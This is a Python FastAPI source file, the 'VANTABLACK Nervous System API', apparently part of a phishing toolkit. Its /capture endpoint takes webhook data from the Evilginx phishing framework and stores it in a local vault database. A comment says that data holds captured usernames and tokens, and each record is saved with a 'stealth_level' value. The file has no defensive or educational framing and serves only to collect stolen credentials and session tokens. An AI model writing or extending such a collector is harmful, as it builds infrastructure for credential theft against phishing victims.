from fastapi import FastAPI, Request, BackgroundTasks
from .db import VantaDatabase
import uvicorn
from threading import Thread

app = FastAPI(title="VANTABLACK Nervous System API")
db = VantaDatabase(db_path="hitch_vault.db")

@app.post("/capture")
async def receive_capture(request: Request, background_tasks: BackgroundTasks):
    """
    ENDPOINT: /capture
    ROLE: Receives raw data sent by Evilginx.
    ARCHITECTURAL DECISION: Use BackgroundTasks to avoid locking 
    the Evilginx engine during DB write.
    """
    data = await request.json()
    background_tasks.add_task(process_capture, data)
    return {"status": "received"}

def process_capture(data):
    """
    FUNCTION: Analyzes and stores the capture.
    """
    source = data.get("phishlet", "unknown")
    # Extract sensitive data (usernames, tokens, etc.)
    # Format depends on the webhook received from the engine
    content = str(data)
    db.save_capture(source=source, data=content, stealth_level=3)

def start_api(host="127.0.0.1", port=8000):
    """
    LAUNCHES the API server in a separate thread.
    """
    def run():
        uvicorn.run(app, host=host, port=port, log_level="error")
    
    Thread(target=run, daemon=True).start()
    print(f"[*] Nervous System (API) online at http://{host}:{port}")

if __name__ == "__main__":
    start_api()
